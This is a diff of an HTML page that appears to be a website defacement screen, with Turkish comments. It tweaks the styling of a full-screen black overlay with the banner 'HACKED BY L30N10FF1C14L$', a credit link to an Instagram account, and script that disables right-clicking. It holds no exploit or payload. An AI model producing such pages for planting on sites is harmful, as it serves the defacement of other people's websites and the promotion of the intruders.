@@ -10,10 +10,10 @@
             position: fixed;
             top: 0;
             left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: #000000; /* Tamamen siyah arka plan */
-            z-index: 9998;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 1); /* Tam siyah arka plan */
+            z-index: 9998; /* Kanvasın bir altında olacak */
             display: flex;
             align-items: center;
             justify-content: center;
@@ -22,21 +22,6 @@
             color: #00ff00;
             overflow: hidden;
         }
-
-        /* Küçük Arka Plan Görüntüsü */
-        .background {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 800px;
-            height: 600px;
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            transform: translate(-50%, -50%);
-            opacity: 0.2;
-            z-index: 0;
-        }   
 
         /* Binary Efekti için Overlay */
         .binary-overlay {
@@ -104,7 +89,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 9999;
+            z-index: 9999; /* Kanvası en öne alıyoruz */
             pointer-events: none;
         }
     </style>
@@ -113,9 +98,6 @@
     
     <!-- Hacked Overlay -->
     <div id="hacked-overlay">
-        <!-- Küçük Arka Plan Görüntüsü -->
-        <div class="background"></div>
-
         <!-- Binary Efekti için Overlay -->
         <div class="binary-overlay"></div>  
 
@@ -123,12 +105,15 @@
         <div class="content">
             <h1>☠️ HACKED BY L30N10FF1C14L$ ☠️</h1>
             <p>We Are Shadows in the Code, Unseen but Everywhere.</p><br>
-            <p>By <u><a href="https://www.instagram.com/leoniofficials/" style="color: white;">leoniofficials</a></u></p>
+
+            <p>By <u><a href="https://www.instagram.com/leoniofficials/" style="color: white;">leoniofficials</a></u>
+        
+        </p>
         </div>
     </div>
 
     <!-- JavaScript Kodu -->
-    <script >
+    <script>
         // Sağ Tıklamayı Engelle
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
